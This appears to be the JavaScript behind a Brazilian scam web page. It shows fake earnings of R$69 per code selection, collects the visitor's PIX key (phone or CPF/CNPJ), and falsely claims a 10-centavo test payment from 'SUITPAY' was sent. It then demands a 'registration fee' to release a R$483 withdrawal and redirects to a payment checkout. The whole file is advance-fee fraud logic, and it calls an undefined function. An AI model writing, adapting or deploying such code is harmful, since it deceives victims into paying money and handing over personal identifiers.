// Criando os códigos aleatórios
function gerarCodigoAleatorio() {
    const caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let codigo = '';
    for (let i = 0; i < 8; i++) {
      codigo += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
    }
    return codigo;
  }

  let selecionado = null;
  
  function selecionarCodigo(elemento) {
    if (selecionado) {
      selecionado.classList.remove('selecionado');
    }
    selecionado = elemento;
    selecionado.classList.add('selecionado');
  }
  
  // Logos e códigos dinâmicos
  let saldo = 0;
  let currentIndex = 0;
  
  function atualizarSaldo(valor) {
    // Soma o valor de R$69,00 para o saldo ao clicar em "Enviar"
    saldo += valor;
    document.getElementById('saldo-valor').textContent = saldo.toFixed(2);
    // Para a soma e realiza a ação após atingir o valor de R$207,00
    if (saldo >= 207) {
      document.getElementById('codigo-gerado').textContent = "Antes de realizar seu 1º saque";
      document.getElementById('codes-container').innerHTML = `
        <div id="opcoes-chave-pix">
          <div>CADASTRE SUA CHAVE PIX.</div>
          <div>Vamos te enviar um PIX TESTE de R$0,10 centavos para confirmar se está tudo certo. Selecione sua chave pix:</div>
          <select id="chave-pix">
            <option value="Celular">Celular</option>
            <option value="CNPJ/CPF">CNPJ/CPF</option>
          </select>
          <input type="text" id="chave-input" placeholder="Digite sua chave PIX">
          <button id="submit-chave">Enviar</button>
        </div>
      `;
      document.getElementById('opcoes-chave-pix').style.display = 'block';
      document.getElementById('submit-chave').addEventListener('click', cadastrarChavePix);
    }
  }
  
  function cadastrarChavePix() {
    // Simulação do cadastro da chave PIX
    alert("Chave PIX cadastrada com sucesso!\n\nVocê recebeu o seu saque teste de 10 CENTAVOS em nome de 'SUITPAY'. Verifique suas notificações ou extrato bancário!\n\nAgora basta realizar mais 4 confirmações de códigos para realizar seu 1º saque!");
    // Redirecionar para a URL após o envio da chave PIX
    window.location.href = "https://checkout.perfectpay.com.br/pay/PPU38CNLQPP";
  }
  
  // Respostas para cada seleção de código
  function gerarCodigo() {
    const codigo = gerarCodigoAleatorio();
    document.getElementById('codigo-gerado').textContent = codigo;
    document.getElementById('codigo-errado').textContent = gerarCodigoAleatorio();
    document.getElementById('codigo-certo').textContent = codigo;
  }
  
  // Inicia a geração dinâmica dos códigos para serem selecionados
  function iniciar() {
    gerarCodigo();
    
    document.querySelectorAll('.codigo').forEach(function(codigo) {
      codigo.addEventListener('click', function() {
        selecionarCodigo(codigo);
      });
    });
    
    document.getElementById('submit-btn').addEventListener('click', function() {
      if (!selecionado) {
        alert("Por favor, selecione um código.");
        return;
      }
      if (selecionado.id === 'codigo-errado') {
        alert("Código escolhido é o errado.");
        return;
      }
      alert(`Saldo atualizado!\
      \n\nVocê recebeu:\nR$ 69,00\npelo código ${document.getElementById('codigo-gerado').textContent}`);
      atualizarSaldo(69);
      gerarCodigo();
    });

    document.getElementById('submit-chave').addEventListener('click', function() {
      // Redirecionar após o envio da chave PIX
      cadastrarChavePix();
      setTimeout(function() {
        alert("O seu saque já está QUASE finalizado!\n\nPara continuar lucrando dentro do aplicativo e finalizar seu saque de R$483 reais agora!\n\nPague apenas uma taxa de cadastro.\n\nMas fique tranquilo, você receberá esse valor na sua conta após o saque!");
        enviarChavePIX(); 
      }, 1000);
    });
  }

  iniciar();